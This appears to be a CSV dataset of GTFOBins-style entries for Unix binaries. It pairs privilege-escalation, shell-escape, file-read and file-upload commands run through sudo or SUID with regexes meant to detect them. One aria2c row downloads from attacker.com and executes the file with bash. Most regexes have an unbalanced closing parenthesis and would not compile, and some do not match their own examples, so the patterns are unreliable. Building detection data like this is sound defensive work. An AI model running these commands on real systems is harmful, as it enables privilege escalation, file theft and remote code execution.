Name,Function,ExampleCode,Regex
7z,file-read,7z a -ttar -an -so $LFILE | 7z e -ttar -si -so,(?i)(?:sudo\s+)?(?:\S*/)?7z\s+.*)
7z,sudo,sudo 7z a -ttar -an -so $LFILE | 7z e -ttar -si -so,(?i)(?:sudo\s+)?(?:\S*/)?7z\s+.*)
aa-exec,shell,aa-exec /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?aa\-exec\s+.*/bin/sh)
aa-exec,suid,./aa-exec /bin/sh -p,(?i)(?:sudo\s+)?(?:\S*/)?aa\-exec\s*\-p\s+.*/bin/sh)
aa-exec,sudo,sudo aa-exec /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?aa\-exec\s+.*/bin/sh)
ab,file-upload,ab -p $LFILE $URL,(?i)(?:sudo\s+)?(?:\S*/)?ab\s*\-p\s+.*)
ab,file-download,ab -v2 $URL,(?i)(?:sudo\s+)?(?:\S*/)?ab\s+.*)
ab,suid,./ab -p $LFILE $URL,(?i)(?:sudo\s+)?(?:\S*/)?ab\s*\-p\s+.*)
ab,sudo,sudo ab -p $LFILE $URL,(?i)(?:sudo\s+)?(?:\S*/)?ab\s*\-p\s+.*)
agetty,suid,./agetty -o -p -l /bin/sh -a root tty,(?i)(?:sudo\s+)?(?:\S*/)?agetty\s*\-o\s*\-p\s*\-l\s*\-a\s+.*/bin/sh)
alpine,file-read,"alpine -F ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?alpine\s*\-F\s+.*)
alpine,suid,"./alpine -F ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?alpine\s*\-F\s+.*)
alpine,sudo,"sudo alpine -F ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?alpine\s*\-F\s+.*)
ansible-playbook,shell,"echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
ansible-playbook $TF",(?i)(?:sudo\s+)?(?:\S*/)?ansible\-playbook\s+.*/bin/sh)
ansible-playbook,sudo,"echo '[{hosts: localhost, tasks: [shell: /bin/sh </dev/tty >/dev/tty 2>/dev/tty]}]' >$TF
sudo ansible-playbook $TF",(?i)(?:sudo\s+)?(?:\S*/)?ansible\-playbook\s+.*/bin/sh)
ansible-test,shell,ansible-test shell,(?i)(?:sudo\s+)?(?:\S*/)?ansible\-test\s+.*)
ansible-test,sudo,sudo ansible-test shell,(?i)(?:sudo\s+)?(?:\S*/)?ansible\-test\s+.*)
aoss,shell,aoss /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?aoss\s+.*/bin/sh)
aoss,sudo,sudo aoss /bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?aoss\s+.*/bin/sh)
apache2ctl,file-read,"apache2ctl -c ""Include $LFILE"" -k stop",(?i)(?:sudo\s+)?(?:\S*/)?apache2ctl\s*\-c\s*\-k\s+.*)
apache2ctl,sudo,"sudo apache2ctl -c ""Include $LFILE"" -k stop",(?i)(?:sudo\s+)?(?:\S*/)?apache2ctl\s*\-c\s*\-k\s+.*)
apt-get,shell,"apt-get changelog apt
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?apt\-get\s+.*/bin/sh)
apt-get,sudo,"sudo apt-get changelog apt
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?apt\-get\s+.*/bin/sh)
apt-get,sudo,"echo 'Dpkg::Pre-Invoke {""/bin/sh;false""}' > $TF
sudo apt-get install -c $TF sl",(?i)(?:sudo\s+)?(?:\S*/)?apt\-get\s*\-c\s+.*/bin/sh)
apt-get,sudo,sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?apt\-get\s*\-o\s+.*/bin/sh)
apt,shell,"apt changelog apt
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?apt\s+.*/bin/sh)
apt,sudo,"sudo apt changelog apt
!/bin/sh",(?i)(?:sudo\s+)?(?:\S*/)?apt\s+.*/bin/sh)
apt,sudo,"echo 'Dpkg::Pre-Invoke {""/bin/sh;false""}' > $TF
sudo apt install -c $TF sl",(?i)(?:sudo\s+)?(?:\S*/)?apt\s*\-c\s+.*/bin/sh)
apt,sudo,sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh,(?i)(?:sudo\s+)?(?:\S*/)?apt\s*\-o\s+.*/bin/sh)
ar,file-read,"ar r ""$TF"" ""$LFILE""
cat ""$TF""",(?i)(?:sudo\s+)?(?:\S*/)?ar\s+.*)
ar,suid,"./ar r ""$TF"" ""$LFILE""
cat ""$TF""",(?i)(?:sudo\s+)?(?:\S*/)?ar\s+.*)
ar,sudo,"sudo ar r ""$TF"" ""$LFILE""
cat ""$TF""",(?i)(?:sudo\s+)?(?:\S*/)?ar\s+.*)
aria2c,command,"echo ""$COMMAND"" > $TF
chmod +x $TF
aria2c --on-download-error=$TF http://x",(?i)(?:sudo\s+)?(?:\S*/)?aria2c\s+.*)
aria2c,command,aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=bash http://attacker.com/aaaaaaaaaaaaaaaa,(?i)(?:sudo\s+)?(?:\S*/)?aria2c\s+.*)
aria2c,file-download,"aria2c -o ""$LFILE"" ""$URL""",(?i)(?:sudo\s+)?(?:\S*/)?aria2c\s*\-o\s+.*)
aria2c,sudo,"echo ""$COMMAND"" > $TF
chmod +x $TF
sudo aria2c --on-download-error=$TF http://x",(?i)(?:sudo\s+)?(?:\S*/)?aria2c\s+.*)
aria2c,limited-suid,"echo ""$COMMAND"" > $TF
chmod +x $TF
./aria2c --on-download-error=$TF http://x",(?i)(?:sudo\s+)?(?:\S*/)?aria2c\s+.*)
arj,file-read,"arj a ""$TF"" ""$LFILE""
arj p ""$TF""",(?i)(?:sudo\s+)?(?:\S*/)?arj\s+.*)
arj,file-write,"echo DATA >""$TF/$LFILE""
arj a ""$TF/a"" ""$TF/$LFILE""
arj e ""$TF/a"" $LDIR",(?i)(?:sudo\s+)?(?:\S*/)?arj\s+.*)
arj,sudo,"echo DATA >""$TF/$LFILE""
arj a ""$TF/a"" ""$TF/$LFILE""
sudo arj e ""$TF/a"" $LDIR",(?i)(?:sudo\s+)?(?:\S*/)?arj\s+.*)
arj,suid,"echo DATA >""$TF/$LFILE""
arj a ""$TF/a"" ""$TF/$LFILE""
./arj e ""$TF/a"" $LDIR",(?i)(?:sudo\s+)?(?:\S*/)?arj\s+.*)
arp,file-read,"arp -v -f ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?arp\s*\-v\s*\-f\s+.*)
arp,suid,"./arp -v -f ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?arp\s*\-v\s*\-f\s+.*)
arp,sudo,"sudo arp -v -f ""$LFILE""",(?i)(?:sudo\s+)?(?:\S*/)?arp\s*\-v\s*\-f\s+.*)
as,file-read,as @$LFILE,(?i)(?:sudo\s+)?(?:\S*/)?as\s+.*)
